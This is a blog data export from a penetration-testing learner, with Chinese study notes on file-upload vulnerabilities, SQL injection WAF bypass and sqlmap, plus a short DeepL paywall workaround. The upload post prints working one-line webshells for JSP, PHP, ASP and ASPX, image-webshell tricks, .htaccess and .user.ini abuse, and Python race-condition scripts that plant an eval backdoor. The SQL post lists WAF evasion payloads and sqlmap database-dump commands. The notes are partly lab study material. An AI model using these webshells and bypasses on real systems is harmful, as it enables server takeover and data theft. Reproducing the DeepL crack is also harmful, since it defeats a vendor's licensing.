{"meta":{"title":"J3fffff's Blog","subtitle":"","description":"","author":"Jeff","url":"https://j3f5.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-05-22T08:59:44.739Z","updated":"2023-05-22T08:59:44.739Z","comments":false,"path":"/404.html","permalink":"https://j3f5.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2023-05-26T05:23:00.823Z","updated":"2023-05-26T05:23:00.823Z","comments":false,"path":"about/index.html","permalink":"https://j3f5.github.io/about/index.html","excerpt":"","text":"此文档收录比较有用的资源链接 目前的方向 [ ] java审计 [ ] WAF初识 [ ] 安卓取证与对应攻击 [ ] 车联网渗透基础 [ ] web渗透基础 优秀课程 全套渗透 小迪安全 笔记1：https://www.yuque.com/gemaxianrenhm/hahwdw 笔记2：https://www.cnblogs.com/SnowSec/category/1908585.html 笔记3：https://blog.csdn.net/mctsog/category_11584480_2.html 暗月渗透 知识论坛 全面 CN-SEC中文网：https://cn-sec.com/ IOT IOTsec-Zone：https://iotsec-zone.com/ 知识库 大类库 https://github.com/YinWC/Security_Learning"},{"title":"分类","date":"2023-05-22T08:59:44.741Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"categories/index.html","permalink":"https://j3f5.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2023-05-22T10:10:32.005Z","updated":"2023-05-22T08:59:44.741Z","comments":false,"path":"books/index.html","permalink":"https://j3f5.github.io/books/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":false,"path":"repository/index.html","permalink":"https://j3f5.github.io/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-05-22T08:59:44.742Z","updated":"2023-05-22T08:59:44.742Z","comments":true,"path":"links/index.html","permalink":"https://j3f5.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-05-22T08:59:44.743Z","updated":"2023-05-22T08:59:44.743Z","comments":false,"path":"tags/index.html","permalink":"https://j3f5.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"文件上传基础","slug":"文件上传基础","date":"2023-05-25T02:29:28.000Z","updated":"2023-05-29T14:39:29.199Z","comments":true,"path":"articles/2023/05/25/文件上传基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/","excerpt":"","text":"文件上传基础 利用思路 补充 一般上传代码 代码内容：其中 uploadfile 就是上传文件的实例，然后通过$_FILE来对文件信息进行读取，然后进行判断，是对应的！！！ 1234567891011&lt;?phpecho $_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;];echo $_FILE[&#x27;uploadfile&#x27;][&#x27;type&#x27;] != &quot;image/png&quot;;// 这个move...函数需要重点注意，是上传的重要函数move_uploaded_file($_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;], &#x27;../upload/&#x27;.$_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;]);?&gt;&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;uploadfile&quot;/&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;&lt;/form&gt; 文件上传漏洞如何查找及判断？ 黑盒查找。文件后台、会员中心、文件扫描。 一般可以通过url搜索上传界面 site：easyicon.net upload或inurl:upload.php 文件后台 进入网站后台不一定获得网站权限，可以从后台获取网站权限（后台拿webshell） 会员中心 通过图片上传 文件扫描 使用工具扫描出后台路径 白盒查找。通过代码分析到上传漏洞、查找文件上传功能。 对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。 注入点失败： 上传后没有返回路径（如果知道CMS类型那就好办） 上传失败 一句话木马 jsp：&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt; php：&lt;?php @eval($_POST[‘h4ck’]) ?&gt; asp：&lt;%eval request (“h4ck”)%&gt; aspx：&lt;%@ Page Language=“Jscript”%&gt; &lt;%eval(Request.Item[“h4ck”],“unsafe”);%&gt; 他们还有很多变体，但是都离不开命令执行函数。每种脚本的命令执行函数都有不少。其他的 图片马 jpg：图像以ff d8开头 gif：GIF89a 无敌，在前面加上这个就可以了！不需要什么图片啊啥的！ 然后再加上一句话木马。 也可以使用copy（需要在cmd下），即copy 1.png /b + shell.php /a webshell.jpg 整体思路 先扫目录，到什么会员中心找到上传漏洞点 筛选中间件看有没有解析漏洞 没有的话，进行注入&amp;&amp;绕过 不成功，就去看CMS版本和对应的漏洞 没有类似CMS漏洞，去找编辑器与最近的CVE漏洞 漏洞与绕过 JS前端绕过 关闭前端js即可 文件类型（黑名单绕过） 大小写/双写绕过 文件名：也就是后缀名。包括黑白名单等。 绕过：Php大小写、pphphp双写 其他特殊后缀绕过 .phtml .php5 上传函数绕过(./绕过) 上传函数：move_uploaded_file函数会忽略掉文件末尾的/. 绕过：可以构造save_path=1.php/.，这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php 空格、点绕过(windows) 当接收文件时，后台代码的限制条件中没有去除文件名首尾的空格(或是没有对.进行拆分)时，可以利用windows系统的命名规则进行绕过：如，将文件后缀改为xxx.php、xxx.php.、xxx.php . 在windows下xx.jpg[空格] 或xx.jpg.这两类文件是不允许存在的，若这样命名，windows会默认去除空格或点 还有些情况具体就需要看代码逻辑，比如如果代码只删除一次点且只去除一次首尾空格，在windows环境下就可以用xxx.php. .进行绕过 ::$DATA绕过(windows) ::$DATA绕过同样利用了windows的特性 NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 即在php+windows的环境下,如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名。 .htaccess绕过（详细见后） .user.ini绕过（详细见后） 解析漏洞绕过（详细见后） 文件检测（白名单） MIME content-type绕过 文件类型：MIME类型，MIME类型就是image/png之类的content-type 涉及函数mime_content_type MIME类型：image/png、audio/mpeg # mp3 %00截断（详细见后） 00截断绕过方式需要满足以下条件 1php版本小于5.3.4``php.ini的magic_quotes_gpc为OFF状态``使用move_uploaded_file函数且参数受用户控制 此时move_uploaded_file函数遇到0x00会截断 可以将上传文件后缀改为xx.php%00进行绕过 %0a绕过 %0a绕过方式需要满足以下条件 1Apache httpd 2.4.0至2.4.29``FileMatch正则匹配.php|.php5等后缀 该版本apache会通过$匹配后缀，而$匹配时会正则匹配某字符串结尾或以换行符结尾的一个字符串，即php[换行符]会被匹配成php 可以将上传文件后缀改为xx.php%0a进行绕过 其他 文件头绕过 文件头：内容头消息 涉及函数getimagesize和exif_imagetype函数。 文件头：gif: GIF89a、png: HEX 89 50 4E 47 0D 0A 1A 0A、jpg: HEX FF D8 FF 以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。 1copy safe.jpg /b + shell.php /a shell.jpg 在该场景下，防御姿势除了基本的黑/白名单外，还包括了对一些特定字符的限制，具体情况可以进行fuzz或者有条件可以进行代码审计 条件竞争/二次渲染绕过（详细见后） 内容逻辑数组绕过与目录命名 此部分将文件名分成3部分组成一个数组,例如将&quot;xx.jpg&quot;分为:“xx”、“.”、&quot;jpg&quot;三部分 其将文件名分为3个部分，分别检测并且拼接。我们可以改数组绕过 我们抓包将.php/.jpg分三部分修改即可绕过，此时第一部分为.php/，第二部分.，第三部分jpg，后面会拼接成：.php/.，因为上面的move_uploadfile会忽略./所以，上传成功。 00截断 00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的白名单限制。 所以：0x00，%00，/00都是可以的！ %00截断的条件 php版本要小于5.3.4 修改php.ini的magic_quotes_gpc为OFF状态（magic_quotes_gpc他的作用类似addslashes()，就是对输入的字符创中的字符进行转义处理） 上传路径是可以控制的 则修改路径 上面的12.php后面多了%00，造成了右边的截断，空格后面的全部都不要了。 需要注意的是，可能会对%00进行编码。 如何利用 注意，这里面有一个重命名，是我们可以控制的，所以我们可以抓包，然后在POST请求中修改road参数即可！ 修改之后变成： 报错，因为要.jpg为后缀，所以在文件名后面加上.jpg即可（全部都要修改）： 逻辑安全 二次渲染 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸，保存，删除 要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片（标准化）并放到网站对应的标签进行显示。 形式：判断图片格式后用imagecreatefromjpeg()函数进行二次渲染 绕过方式： 抓包找到二次渲染中未被改动的地方，将一句话马插入该地方，.jpg|.png|.gif三种文件格式不同，所以构造马的方式也不同 注：gif文件最简单，直接用ue等16进制编辑器就可以改，但是jpg和png需要特殊的构造脚本 先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。将保存下来经过服务器二次渲染的那张jpg图片，用010编辑器与我们的图片马进行比对，看哪一些字节是被更改过的，在没有被更改的地方替换成我们的马重新上传。 用此脚本进行处理生成payload.jpg。然后再上传payload.jpg 条件竞争（先上传再校验） 一些网站上传文件的逻辑是先允许上传任意文件，然后检测上传文件的文件包是否合法（校验文件后缀、内容等），如果不合法则删除文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行检查文件和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。 造成漏洞的原因：先保存文件，再判断是否是允许的文件，如果不允许，则删除。 漏洞利用思路：上传一个写入木马的php文件backdoor.php，抓取数据包，对此数据包进行多线程高并发的重放。与此同时，用python不断的请求文件backdoor.php，由于多线程高并发的重放上传backdoor.php文件，所以一定会存在上传成功但还未来得及删除的backdoor.php文件使得python请求成功，一旦请求成功则会在本地写入木马。用菜刀连接即可getshell。 注意：这种条件竞争，即使你执行了一次，在那段时期内，这个不会被删（正在请求），但是一旦请求完毕，二次渲染完成，则该文件照样被删除！所以，请注意你的脚本是要 执行创建木马文件 的功能的。 123#backdoor.php#用来写入木马文件shell.php&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_PO[&quot;cmd&quot;])?&gt;&#x27;);?&gt; 1234567891011#requests_2.py#用来请求backdoor.phpimport requestsurl = &quot;http://ip/upload-labs/upload/backdoor.php&quot;url_2 = &quot;http://ip/upload-labs/upload/shell.php&quot;while True: html = requests.get(url) html_2 = requests.get(url_2) if html_2.status_code == 200: #判断shell.php是否写入成功 print(&quot;OK&quot;) break 先上传文件backdoor.php，抓取数据包发送到Inturder模块 高并发上传脚本： 1234567891011121314151617181920#upload.pyimport requestsfrom threading import Threadfile = &#123; #文件信息和文件 &quot;upload_file&quot;:open(&#x27;C:\\\\users\\\\xiamo\\\\desktop\\\\backdoor.php&#x27;), &quot;Content-Type&quot;:&quot;application/octet-stream&quot;, &quot;Content-Disposition&quot;:&quot;form-data&quot;, &quot;filename&quot;:&quot;backdoor.php&quot;&#125;url = &quot;http://192.168.1.120/upload-labs/Pass-17/index.php&quot;data = &#123; #参数 &quot;submit&quot;:&quot;上传&quot;&#125;def upload(): res = requests.post(url, files=file, data=data) print(res.status_code)while True: t = Thread(target=upload()) #创建线程 t.start() #开启线程 另外，使用inturder功能的步骤如下： 清除$$： 设置null payload： 设置多线程： 然后在浏览器中不停地访问那个上传的文件即可。 user.ini与.htaccess绕过 user.ini 利用范围 以fastcgi运行的php 首先得知道php.ini然后再去了解：.user.ini。它比.htaccess用的更广。.user.ini文件上传绕过和.htaccess文件上传绕过方式相似，都是上传一个攻击者自定义的配置文件导致服务器对图片文件的错误处理而导致的文件执行，但是.user.ini使用更加广泛，只要是以fastcgi运行的php都可以用这个方法，但是它的局限性在于上传的.user.ini文件目录必须存在可执行的php文件。 参考：https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html 简析 user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。 user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。 除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。 配置变量中有auto_prepend_file和auto_apend_file指定在文件前和文件尾包含文件。（这两个才是我们可以上传马的关键，指）如: 12auto_apend_file=01.gif # 指定一个文件，自动包含在要执行的文件前。auto_prepend_file=01.gif # 指定一个文件，自动包含在要执行的文件后。 所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 利用 新建一个文件名为.user.ini的文件，并将内容写为： 1auto_prepend_file=test.txt 将.user.ini上传至服务器 新建一个文件名为test.txt的文件，并将内容写为如下，或者写webshell马： 1&lt;?php phpinfo();?&gt; 再访问上传目录下的???.php，即可将test.txt内的内容脚本正常执行。 .htaccess 见apache解析漏洞绕过 解析漏洞 IIS解析漏洞 目录解析漏洞（/test.asp/1.jpg） 在 IIS5.x/6.0 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 /test.asp/1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了。 文件名解析漏洞(test.asp;.jpg) 在 IIS5.x/6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。 畸形解析漏洞(test.jpg/*.php) 微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5 在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码 1&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[x])?&gt;&#x27;)?&gt; 将文件保存成test.jpg格式，上传到服务器，假设上传路径为/upload，上传成功后，直接访问/upload/test.jpg/x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行（这个的执行过程看下面），所以图片里面的代码就会被执行。我们会神奇的发现在 /upload 目录下创建了一个一句话木马文件 shell.php。 临时解决办法：设置 cgi.fix_pathinfo为0 Ngnix解析漏洞 畸形解析漏洞(test.jpg/*.php) 原因：php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo（默认为1表示开启）。/etc/php5/fpm/pool.d/www.conf中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行 例子： test.jpg存在（已上传），a.php不存在 访问：test.jpg/a.php。因为a.php，所以交给PHP处理；PHP发现没有这个文件，那么删除后面的a.php访问test.jpg，然后发现这个不是php文件，执行不了，于是返回Access denied。 但是Ngnix+php就可以，而且与Nginx无关，但在高版本的php中，由于security.limit_extensions 的引入，使得该漏洞难以被成功利用。因为Nginx只要一看URL中路径名以.php结尾，便不管该文件是否存在，直接交给php处理。而如Apache等，会先看该文件是否存在，若存在则再决定该如何处理。 cgi.fix_pathinfo是php具有的，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。（IIS在这一点和Nginx是一样的，同样存在这一问题） %00空字节代码解析漏洞 原理：Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码 在以下版本的nginx中，我们在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码，此时，会把xxx.jpg文件当作php来执行。 Nginx 0.5.* Nginx 0.6.* Nginx 0.7 &lt;= 0.7.65 Nginx 0.8 &lt;= 0.8.37 CVE-2013-4547(%20%00) //跟畸形漏洞好像啊 影响nginx版本：nginx 0.8.41 ~ 1.5.6. 这一漏洞的原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。 即：假设服务器上存在文件：file.jpg(空格) ，注意文件名的最后一个字符是空格。则可以通过访问：http://127.0.0.1/file.jpg \\0.php 让Nginx认为文件file.jpg(空格)的后缀为.php。 上传一个test.jpg(空格)，然后访问它，因为访问时URL编码会将空格变成%20，所以访问的实际内容是test.jpg%20，不存在，那么我们访问test.jpgAAAphp，通过BP抓包，然后将三个A的ASCII分别改成：20 00 2e(这个翻译过来就是 点)。即我们访问的是有空格的php文件。但是Access denied，因为PHP的设置让我们没办法执行这个PHP文件代码（因为它不是php后缀），security.limit_extensions的存在，导致我们并不能利用此漏洞（跟畸形漏洞一个解释）。 Apache解析漏洞 文件名解析漏洞 从右往左解析，遇到不能执行的就继续向左解析，直到可以运行解析到可识别后缀 罕见后缀 上面的黑名单很多都是罕见的 htaccess文件与httpd.conf文件 .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 .htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 httpd.conf 文件中配置。 httpd.conf 和 .htaccess 用于配置 Apache Web 服务器（稍后我们将讨论它们之间的相同点和不同点）。另一方面，php.ini 用于配置 PHP 运行时，允许您在其上执行动态 Web 应用程序的 PHP 代码。 httpd.conf 和 .htaccess 都是 Apache Web 服务器的基于文本的配置文件。 httpd.conf 中的配置适用于整个服务器，而 htaccess 中的配置仅适用于它所在的文件夹（及其所有子文件夹）。 httpd.conf 文件在服务器启动时读取。当您对其进行更改时，您需要重新启动 Apache。另一方面，.htaccess 文件在每次 HTTP 请求时都会被读取，因此对它们的更改不需要重新启动服务器。 生效的前提： 12mod_rewrite 模块开启AllowOverride All(默认为None) 常见： 把所有名字里面带有shell的文件当成php脚本来执行 123&lt;FilesMatch &quot;shell.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 让.jpg后缀名文件格式的文件名以php格式解析 1AddType application/x-httpd-php .jpg 问题： 如果配置错误会出现错误：Internal Server Error 图片木马出现：Parse error: syntax error, unexpected ')' in /var/www/html/upload/piccreate_muma.jpg on line 14 漏洞修复（中间件/CVE/其他漏洞） 编辑器漏洞 这个编辑器就是网页的那种编辑器，例如有的网站有编辑器，使用第三方，然后对音频、文字进行处理。大多数网页编辑器的漏洞都是上传漏洞！ 手册：https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1 漏洞利用 需要知道两个点： 使用了什么编辑器（名字+版本） 知道编辑器的路径 然后： 在网上查exp，在本地执行，使用它的脚本攻击这个网站 那么，怎么知道使用了什么编辑器？ 网站扫描 在后台看插件 CMS上传 通达OA：当发现一个OA系统，搜索他有什么漏洞，然后根据exp运行就好。会有很多方案，例如先上传后通过文件包含来运行。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"一些有用的破解—日常篇","slug":"一些有用的破解—日常篇","date":"2023-05-25T00:56:16.000Z","updated":"2023-05-25T01:02:10.131Z","comments":true,"path":"articles/2023/05/25/一些有用的破解—日常篇/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/25/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E7%A0%B4%E8%A7%A3%E2%80%94%E6%97%A5%E5%B8%B8%E7%AF%87/","excerpt":"","text":"Deepl pro 破解翻译后的docx文档只读 问题描述：使用DeepL翻译出来的文档是只读模式，显示不订阅pro版本之前都是不能编辑。 解决方法：将文档另存为.xml文档，然后右键用记事本打开，CTRL+F查找：&lt;w:documentProtection,，找到之后，有两种方法： 删除这一段完整标签&gt;，保存，之后修改文档后缀名为.doc，打开之后发现文档已经可以编辑了。 找到Protection后 w:enforcement=“1” 改为 w:enforcement=“0” 重命名为.doc 就OK了 破解网页版5000字限制 看：https://github.com/blueagler/DeepL-Crack","categories":[{"name":"杂","slug":"杂","permalink":"https://j3f5.github.io/categories/%E6%9D%82/"}],"tags":[{"name":"破解","slug":"破解","permalink":"https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"}]},{"title":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","slug":"SQL注入进阶-WAF绕过与SQLMAP工具的使用","date":"2023-05-24T06:46:22.000Z","updated":"2023-05-25T01:16:01.277Z","comments":true,"path":"articles/2023/05/24/SQL注入进阶-WAF绕过与SQLMAP工具的使用/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"WAF绕过 WAF识别与WAF策略 这里不详细说，简单提一下：项目：wafw00f To do its magic, WAFW00F does the following: Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions.（发送HTTP包，并且分析包中的特征，来判断，这可以判断一大批） If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is. 如果不成功，将发送许多(可能是恶意的)HTTP请求，并使用简单的逻辑来推断它是哪个WAF If that is also not successful, it analyses the responses previously returned and uses another simple algorithm to guess if a WAF or security solution is actively responding to our attacks. 如果这也不成功，它将分析先前返回的响应，并使用另一种简单算法来猜测WAF或安全解决方案是否正在积极响应我们的攻击。 WAF策略 WAF针对SQL注入攻击的检测原理是检测SQL关键字、特殊符号、运算符、操作符、注释符的相关组合特征，并进行匹配。 SQL关键字（如 union，Select，from，as，asc，desc，order by，sort，and ，or，load，delete，update，execute，count，top，between，declare，distinct，distinctrow，sleep，waitfor，delay，having，sysdate，when，dba_user，case，delay 等） 特殊符号（’”,; ()） 运算符（±*/%|） 操作符（=，&gt;,&lt;,&gt;=,&lt;=,!=,+=,-=） 注释符（–，/**/） 数据绕过 除了上图提到的简单的这里不解释了（大小写、双写嵌入等） 关键字绕过 大小写、双写嵌入 堆叠注入，绕过select等 注释符绕过： 常用：//，-- , /**/, #, --+, -- -, ;,%00,--a，绕过：Uni/**/on 等价函数绕过 12345678910111213141516171819202122232425and=&amp;&amp; or=|| xor=| not=!# 比较符号（&lt;&gt;）绕过# 使用greatest()、least()# 使用between and。注：between 1 and 1; 等价于 =1hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()# 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者：substr((select &#x27;password&#x27;),1,1) = 0x70strcmp(left(&#x27;password&#x27;,1), 0x69) = 1strcmp(left(&#x27;password&#x27;,1), 0x70) = 0strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 绕过符号 逗号 使用from或者offset。 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： 12select substr(database() from 1 for 1);select mid(database() from 1 for 1); 使用join： 12union select 1,2 #等价于union select * from (select 1)a join (select 2)b 使用like： 12select ascii(mid(user(),1,1))=80 #等价于select user() like &#x27;r%&#x27; 重点：对于limit可以使用offset来绕过： 123select * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0 空格 用tab代替空格，或者用其他空格符%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 使用浮点数： 12select * from users where id=8E0union select 1,2,3select * from users where id=8.0 select 1,2,3 括号绕过： 这种过滤方法常常用于time based盲注,例如： 1?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 等于号 使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt; between 1 and 1; 等价于 =1 引号 宽字节/二次编码注入 编码绕过（用于编译一个字符串，例如查询 id='users'，则可以编译成id=0x0x7573657273十六进制） 通用绕过（编码）非关键字字符串 如URLEncode编码，ASCII,HEX,unicode编码绕过：or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 HTTP参数污染 HTTP参数污染（HTTP Parameter Pollution） 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。 原理 在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。 Web服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) Last JSP/Tomcat Request.getParameter(“par”) First Perl(CGI)/Apache Param(“par”) First Python/Apache getvalue(“par”) All(list) ASP/IIS Request.QueryString(“par”) ALL(comma-delimited string) 绕过 waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容 我们的后端是apache，那么我们只要将参数放在后面即可 注入样例：bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3 WAF逻辑层绕过 逻辑问题 云waf防护，一般我们会尝试查找真实站点的真实ip，从而绕过CDN防护 当提交，GET，POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入，可尝试bypass http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护 特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害输入，从而导致bypass 比如：id=1%00and 1=2 union select 1,2,column_name from imformation_schema.columns 性能问题 猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。 猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。 例子： ?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9 PS：0xA*1000指0xA后面”A&quot;重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。 白名单 IP白名单 从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。 测试方法：修改http的header来bypasswaf X-forwarded-for X-remote-IP X-originating-IP x-remote-addr X-Real-ip 静态资源 特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测 效率，不去检测这样一些静态文件名后缀的请求。 http://10.9.9.201/sql.php?id=1 http://10.9.9.201/sql.php/1.js?id=1 备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别 url白名单 为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势 各种数据库的特殊绕过 参考：https://www.cnblogs.com/SnowSec/p/14288249.html SQLMAP 使用 检查注入点 GET：sqlmap -u http://192.168.208.1:49154/Less-5/?id=1 POST： sqlmap -u http://192.168.208.1:49154/Less-5/ --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot; sqlmap -r post.txt （当前用户下的所有）数据库（–dbs） sqlmap -r post.txt --dbs -v 3 获取当前数据库名：--current-db 查询表（先通过-D指定数据库） 1sqlmap -r post.txt -v 3 -D security --tables 查询列名（先通过-D指定数据库 -T指定表名） 1sqlmap -r post.txt -v 3 -D security -T users --columns 脱库（先通过-D指定数据库 -T指定表名） -C指定列名 然后–dump 1sqlmap -r post.txt -v 3 -D security -T users -C username --dump 直接全部脱出来 1sqlmap -r post.txt -v 3 -D security -T users --dump 获取系统信息 数据库的用户与密码 12sqlmap -r post.txt -v 3 --userssqlmap -r post.txt -v 3 --passwords 获取当前用户名：--current-user ​ 然后去cmd5里查询类型为mysql5的哈希密文，破解即可 --is-dba：当前用户是否为管理权限 该命令用于查看当前账户是否为数据库管理员账户，如下所示 1234567┌──(j3fffff㉿j3fffff)-[~/tmpdir]└─$ sqlmap -r post.txt -v 3 --is-dba[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20),0x7171707071),NULL#[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,JSON_ARRAYAGG(CONCAT_WS(0x697564697a67,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))),0x7171707071),NULL#[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 